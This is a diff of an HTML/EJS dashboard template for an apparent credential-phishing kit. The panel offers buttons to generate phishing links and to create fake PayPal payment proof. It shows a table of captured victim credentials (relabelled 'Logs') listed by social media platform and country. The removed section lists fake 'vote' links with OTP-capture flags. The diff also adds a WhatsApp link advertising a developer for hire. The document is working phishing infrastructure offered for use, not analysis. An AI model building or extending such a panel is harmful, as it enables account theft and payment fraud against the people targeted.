@@ -45,7 +45,7 @@
                 </div>
               </div>
             </div>
-            <h6 class="text-muted font-weight-normal">Credentials</h6>
+            <h6 class="text-muted font-weight-normal">Logs</h6>
             <a href="/credentials" class="btn btn-secondary">See all</a>
           </div>
         </div>
@@ -80,13 +80,19 @@
           <a href="/create-link" class="btn btn-success my-3 mr-2"
             >Generate Phishing Link
           </a>
+          <a href="/links" class="btn btn-danger my-3 mr-2">Links </a>
           <a href="/paypal" class="btn btn-primary my-3 mr-2"
             >Fake Paypal Proof
+          </a>
+          <a
+            href="https://wa.me//+2349053110722"
+            class="btn btn-warning my-3 mr-2"
+            >Hire a web developer <i class="fas fa-computer"></i>
           </a>
           <!-- <a href="/tutorial" class="btn btn-primary my-3 mr-2"
             >Tutorial <i class="mdi mdi-video"></i>
           </a> -->
-          <a href="/settings" class="btn btn-secondary my-3 mr-2"
+          <a href="/settings" class="btn btn-dark my-3 mr-2"
             >Settings <i class="mdi mdi-settings"></i>
           </a>
         </div>
@@ -97,12 +103,12 @@
       <div class="col-12 grid-margin">
         <div class="card">
           <div class="card-body">
-            <h4 class="card-title">Recent Credentials</h4>
+            <h4 class="card-title">Recent Logs</h4>
             <div class="table-responsive">
               <table class="table">
                 <thead>
                   <tr>
-                    <th class="text-white">Credentials</th>
+                    <th class="text-white">Logs</th>
                     <th class="text-white">Social Media</th>
                     <th class="text-white">Country</th>
                     <th class="text-white">Link Name</th>
@@ -135,66 +141,6 @@
               <% if(credentialscount > 10){%>
               <div>
                 <a href="/credentials" class="btn btn-secondary">See all</a>
-              </div>
-              <%}%>
-            </div>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <div class="row text-white">
-      <div class="col-12 grid-margin">
-        <div class="card">
-          <div class="card-body">
-            <h4 class="card-title">Recent Links</h4>
-            <p>
-              Note: These links are subject to change, make sure you recheck
-              before using
-            </p>
-            <div class="table-responsive">
-              <table class="table">
-                <thead>
-                  <tr>
-                    <th class="text-white">Link</th>
-                    <th class="text-white">Social Media</th>
-                    <th class="text-white">Requires OTP</th>
-                    <th class="text-white">Expires</th>
-                  </tr>
-                </thead>
-                <tbody>
-                  <% links.reverse().slice(0,11).forEach((l, index) => {%>
-                  <tr>
-                    <td class="text-white">
-                      <input
-                        type="text"
-                        class="copyInput form-control bg-dark"
-                        value="<%=req.app.voteUrl%>/vote/<%= l.link %>"
-                        readonly
-                      />
-                      <br />
-                      <button
-                        class="copyButton btn btn-secondary"
-                        onclick="copyToClipboard(<%= index %>)"
-                      >
-                        Copy to Clipboard
-                      </button>
-                    </td>
-                    <td class="text-white"><%= l.linkType %></td>
-                    <td class="text-white">
-                      <%= l.otpEnabled ? "True": "False" %>
-                    </td>
-                    <td class="text-white">
-                      <%= moment(l.expiry).format("ddd DD MMM YYYY") %>
-                    </td>
-                  </tr>
-                  <%})%>
-                </tbody>
-              </table>
-
-              <% if(linkscount > 10){%>
-              <div>
-                <a href="/links" class="btn btn-secondary">See all</a>
               </div>
               <%}%>
             </div>
